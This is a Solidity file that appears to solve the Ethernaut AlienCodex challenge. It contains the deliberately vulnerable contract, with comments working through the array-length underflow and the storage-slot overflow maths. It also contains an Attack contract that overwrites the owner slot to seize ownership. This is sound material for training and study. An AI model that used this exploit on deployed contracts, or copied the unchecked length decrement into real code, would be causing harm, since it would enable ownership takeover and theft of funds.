// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./deps/Ownable-05.sol";

contract AlienCodex is Ownable {

  bool public contact; // 0 slot (+ owner)
  bytes32[] public codex; // 1 slot

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  // underflows the length (will be max of uint256)
  // makes it possible to store value into any array index (because in this case all possible array's indexes "exist")
  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    // codex array's element slot formula: keccak256(0x0000000000000000000000000000000000000000000000000000000000000001) + i => 
    // 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + i =>
    // 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + x = 0x10000000000000000000000000000000000000000000000000000000000000000 (zero slot)
    //
    // 0x10000000000000000000000000000000000000000000000000000000000000000
    // 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 -
    // ==================================================================
    // 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
    //
    // to change zero (owner/contact) slot, 'i' must be 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a.
    // while calculating array's element slot, vm overflows, starts counting from zero again, and can rewrite non-array slot
    codex[i] = _content;
  }
}

contract Attack {

  function attack(AlienCodex target) external {
    target.makeContact();
    target.retract();

    bytes memory value = getValue();
    bytes32 input = bytesToBytes32(value);
    target.revise(calculateReviseIndex(), input);

    require(target.owner() == msg.sender, "invalid owner");
    require(target.contact(), "invalid contact state");
  }

  function getValue() public view returns(bytes memory) {
    return abi.encodePacked(uint96(1), msg.sender);
  }

  function bytesToBytes32(bytes memory data) public pure returns(bytes32 res) {
    require(data.length == 32, "invalid data length");
    for (uint i = 0; i < 32; i++) {
      res |= bytes32(data[i] & 0xFF) >> (i * 8);
    }
  }

  function calculateReviseIndex() public pure returns(uint256) {
    bytes32 arraySlot = keccak256(abi.encodePacked(uint256(1)));
    return uint256(0) - uint256(arraySlot);
  } 
}
